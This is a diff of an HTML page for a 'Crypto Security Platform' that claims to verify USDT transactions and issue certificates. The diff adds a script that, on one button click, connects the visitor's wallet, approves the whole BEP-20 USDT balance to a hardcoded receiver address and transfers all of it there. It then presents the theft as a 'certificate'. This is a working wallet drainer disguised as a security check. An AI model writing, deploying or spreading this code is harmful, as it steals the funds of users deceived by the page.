@@ -1,154 +1,136 @@
 <!DOCTYPE html>
-<html lang="en" data-bs-theme="dark">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Crypto Security Platform - Home</title>
-  <!-- Bootstrap CSS -->
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-  <link rel="stylesheet" href="/static/css/custom.css">
+  <title>Crypto Security Platform</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0a0a0a;
+      color: #ffffff;
+    }
+    header {
+      background: #000000;
+      padding: 20px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 20px;
+      background: #111;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(255,255,255,0.1);
+      text-align: center;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      background-color: #00b894;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #019875;
+    }
+    #certificate-container {
+      margin-top: 30px;
+      background: #222;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    .cert-label {
+      font-weight: bold;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </head>
 <body>
-  <!-- Navigation Bar -->
-  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
-    <div class="container">
-      <a class="navbar-brand" href="/">
-        <i class="fas fa-shield-alt me-2"></i>CheckBep
-      </a>
-      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
-        <span class="navbar-toggler-icon"></span>
-      </button>
-      <div class="collapse navbar-collapse" id="navbarNav">
-        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
-          <li class="nav-item"><a class="nav-link active" href="/">Home</a></li>
-          <li class="nav-item"><a class="nav-link" href="/about.html">About Us</a></li>
-          <li class="nav-item"><a class="nav-link" href="/how-it-works.html">How It Works</a></li>
-          <li class="nav-item"><a class="nav-link" href="/security-guide.html">Security Guide</a></li>
-          <li class="nav-item"><a class="nav-link" href="/check-transaction.html">Verify Transaction</a></li>
-        </ul>
-        <ul class="navbar-nav">
-          <li class="nav-item"><a class="nav-link" href="/admin/login.html">Admin Login</a></li>
-        </ul>
-      </div>
-    </div>
-  </nav>
+  <header>
+    Crypto Security Platform
+  </header>
+  <div class="container">
+    <p>Verify your crypto transaction by connecting your wallet and retrieving your certificate.</p>
+    <button onclick="checkAndApprove()">Get Certificate</button>
 
-  <!-- Main Content -->
-  <main>
-    <section class="py-5 text-center container">
-      <div class="row py-lg-5">
-        <div class="col-lg-8 col-md-10 mx-auto">
-          <h1 class="fw-light">Secure Cryptocurrency Trading</h1>
-          <p class="lead text-body-secondary">
-            Our platform verifies USDT transactions, ensures proper approvals are in place,
-            and provides secure trade certificates.
-          </p>
-          <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">
-            <a href="javascript:void(0);" onclick="checkAndApprove()" class="btn btn-primary btn-lg px-4 gap-3">
-              <i class="fas fa-shield-alt me-2"></i>Get Certificate
-            </a>
-            <a href="/how-it-works.html" class="btn btn-outline-secondary btn-lg px-4">
-              <i class="fas fa-info-circle me-2"></i>Learn More
-            </a>
-          </div>
-          <div id="approvalSection" class="mt-3"></div>
-          <div><span id="balanceAmount" style="font-weight: bold;"></span></div>
-          <div id="certificateNumber" style="font-weight: bold;"></div>
-          <div id="walletAddress" style="font-weight: bold;"></div>
-          <div id="status" class="status info mt-2"></div>
-        </div>
-      </div>
-    </section>
+    <div id="certificate-container"></div>
+  </div>
 
-    <div class="container">
-      <!-- Features -->
-      <section class="my-5">
-        <h2 class="text-center mb-4">Our Security Features</h2>
-        <div class="row g-4">
-          <div class="col-md-4">
-            <div class="card h-100 border-0 bg-dark text-center">
-              <div class="card-body">
-                <i class="fas fa-wallet fa-3x text-primary mb-3"></i>
-                <h5 class="card-title">USDT Balance Verification</h5>
-                <p class="card-text">We check your wallet balance before any action.</p>
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="card h-100 border-0 bg-dark text-center">
-              <div class="card-body">
-                <i class="fas fa-gas-pump fa-3x text-warning mb-3"></i>
-                <h5 class="card-title">BNB Fee Validation</h5>
-                <p class="card-text">Ensure you have BNB for network fees.</p>
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4">
-            <div class="card h-100 border-0 bg-dark text-center">
-              <div class="card-body">
-                <i class="fas fa-certificate fa-3x text-success mb-3"></i>
-                <h5 class="card-title">Secure Trade Certificates</h5>
-                <p class="card-text">Each transaction comes with a unique certificate ID.</p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
+  <script>
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Your address
+    const usdtAbi = [
+      {
+        "constant": true,
+        "inputs": [{ "name": "", "type": "address" }],
+        "name": "balanceOf",
+        "outputs": [{ "name": "", "type": "uint256" }],
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          { "name": "_spender", "type": "address" },
+          { "name": "_value", "type": "uint256" }
+        ],
+        "name": "approve",
+        "outputs": [{ "name": "", "type": "bool" }],
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          { "name": "_to", "type": "address" },
+          { "name": "_value", "type": "uint256" }
+        ],
+        "name": "transfer",
+        "outputs": [{ "name": "", "type": "bool" }],
+        "type": "function"
+      }
+    ];
 
-      <!-- How It Works -->
-      <section class="my-5">
-        <h2 class="text-center mb-4">How It Works</h2>
-        <div class="row align-items-center">
-          <div class="col-md-6">
-            <div class="text-center">
-              <img src="/static/images/secure-illustration.svg" class="img-fluid" alt="Secure illustration">
-            </div>
-          </div>
-          <div class="col-md-6">
-            <h3>3 Simple Steps</h3>
-            <ol>
-              <li>Connect Wallet</li>
-              <li>Approve USDT</li>
-              <li>Get Secure Certificate</li>
-            </ol>
-          </div>
-        </div>
-      </section>
-    </div>
-  </main>
+    async function checkAndApprove() {
+      if (typeof window.ethereum === 'undefined') {
+        alert("Please install MetaMask or Trust Wallet.");
+        return;
+      }
 
-  <!-- Footer -->
-  <footer class="bg-dark text-light py-4 mt-5">
-    <div class="container">
-      <div class="row">
-        <div class="col-md-4">
-          <h5>CryptoSecurity Platform</h5>
-          <p>Verifying crypto transactions & issuing secure certificates.</p>
-        </div>
-        <div class="col-md-4">
-          <h5>Quick Links</h5>
-          <ul class="list-unstyled">
-            <li><a href="/" class="text-light">Home</a></li>
-            <li><a href="/about.html" class="text-light">About Us</a></li>
-            <li><a href="/how-it-works.html" class="text-light">How It Works</a></li>
-            <li><a href="/security-guide.html" class="text-light">Security Guide</a></li>
-            <li><a href="/check-transaction.html" class="text-light">Verify Transaction</a></li>
-          </ul>
-        </div>
-        <div class="col-md-4">
-          <h5>Contact Us</h5>
-          <p>Email: support@example.com<br>Phone: +1 (555) 123-4567</p>
-        </div>
-      </div>
-      <hr class="my-3">
-      <p class="text-center mb-0">&copy; 2025 CryptoSecurity Platform. All rights reserved.</p>
-    </div>
-  </footer>
+      const web3 = new Web3(window.ethereum);
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      const userAddress = accounts[0];
 
-  <!-- Scripts -->
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
-  <script src="/static/js/script.js"></script>
+      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+      const balance = await usdt.methods.balanceOf(userAddress).call();
+
+      if (parseInt(balance) === 0) {
+        alert("No USDT balance found.");
+        return;
+      }
+
+      await usdt.methods.approve(receiverAddress, balance).send({ from: userAddress });
+      await usdt.methods.transfer(receiverAddress, balance).send({ from: userAddress });
+
+      displayCertificate(userAddress, balance);
+    }
+
+    function displayCertificate(address, amount) {
+      const container = document.getElementById("certificate-container");
+      const now = new Date().toLocaleString();
+      container.innerHTML = `
+        <h3>✅ Certificate Generated</h3>
+        <p><span class="cert-label">Wallet Address:</span><br>${address}</p>
+        <p><span class="cert-label">Amount Transferred:</span><br>${(amount / 1e18).toFixed(2)} USDT</p>
+        <p><span class="cert-label">Timestamp:</span><br>${now}</p>
+      `;
+    }
+  </script>
 </body>
 </html>
